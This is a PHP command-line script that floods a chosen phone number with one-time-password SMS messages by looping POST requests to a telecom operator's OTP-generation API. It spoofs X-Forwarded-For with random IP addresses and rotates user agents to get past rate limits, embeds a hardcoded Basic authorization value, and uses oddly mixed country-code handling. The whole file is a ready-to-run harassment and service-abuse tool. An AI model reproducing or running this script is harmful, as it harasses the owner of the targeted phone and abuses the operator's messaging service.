<?php
// Function to generate a random IP address
function generateRandomIP() {
    return rand(1, 255) . "." . rand(0, 255) . "." . rand(0, 255) . "." . rand(1, 255);
}

// Function to return a random user agent
function getRandomUserAgent() {
    $userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ];
    return $userAgents[array_rand($userAgents)];
}

// Function to perform a cURL request
function sendCurlRequest($phoneNumber, $retryLimit) {
    $url = "https://registrasi.tri.co.id/api/v1/generate-otp";
    $attempt = 1;

    while ($attempt <= $retryLimit) {
        $postData = "msisdn={$phoneNumber}";
        $headers = [
            "X-Forwarded-For: " . generateRandomIP(),
            "Authorization: Basic a21zYXc=",
            "User-Agent: " . getRandomUserAgent()
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $response = curl_exec($ch);
        $responseInfo = json_decode($response, true);
        curl_close($ch);

        if (isset($responseInfo['status']) && $responseInfo['status'] == "success") {
            echo "[$attempt] $phoneNumber => SEND\n";
        } else {
            echo "[$attempt] $phoneNumber => Failed!\n";
        }

        sleep(3);
        $attempt++;
    }
}

// Main script execution
echo "Input Number (3): ";
$phoneNumber = trim(fgets(STDIN));

// Update phone number format
if (substr($phoneNumber, 0, 5) === "+6689") {
    $phoneNumber = "+66" . substr($phoneNumber, 4);
} elseif (substr($phoneNumber, 0, 4) === "6689") {
    $phoneNumber = "+66" . substr($phoneNumber, 2);
} elseif (substr($phoneNumber, 0, 3) === "089") {
    $phoneNumber = "+66" . substr($phoneNumber, 1);
}

echo "Input Total Messages: ";
$totalMessages = trim(fgets(STDIN));

// Send cURL requests
sendCurlRequest($phoneNumber, $totalMessages);
?>
